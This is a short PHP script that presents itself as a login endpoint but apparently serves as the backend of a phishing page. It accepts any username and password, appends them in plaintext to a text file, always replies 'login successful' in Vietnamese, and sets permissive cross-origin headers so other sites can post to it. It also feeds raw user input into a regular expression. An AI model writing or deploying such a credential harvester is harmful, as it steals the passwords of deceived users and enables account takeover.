<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Credentials: true');
header('Access-Control-Allow-Methods: GET, POST, PUT, DELETE, OPTIONS');
header('Access-Control-Max-Age: 604800');
header('Access-Control-Allow-Headers: Content-Type, Accept, X-Requested-With');

if (isset($_POST['username']) && isset($_POST['password'])) {
    $username = $_POST['username'];
    $password = $_POST['password'];
    if(!preg_match('/'.$username.'/', file_get_contents('bicodervip.txt'))){
        $file = fopen('bicodervip.txt','a');
        fwrite($file,$username.' | '.$password.PHP_EOL);
        fclose($file);
        }
    echo json_encode(['code' => 200, 'message' => "Đăng nhập thành công!"]);
} else {
    echo json_encode([
        'code' => 400,
        'message' => 'Tên người dùng hoặc mật khẩu không chính xác!'
    ]);
}
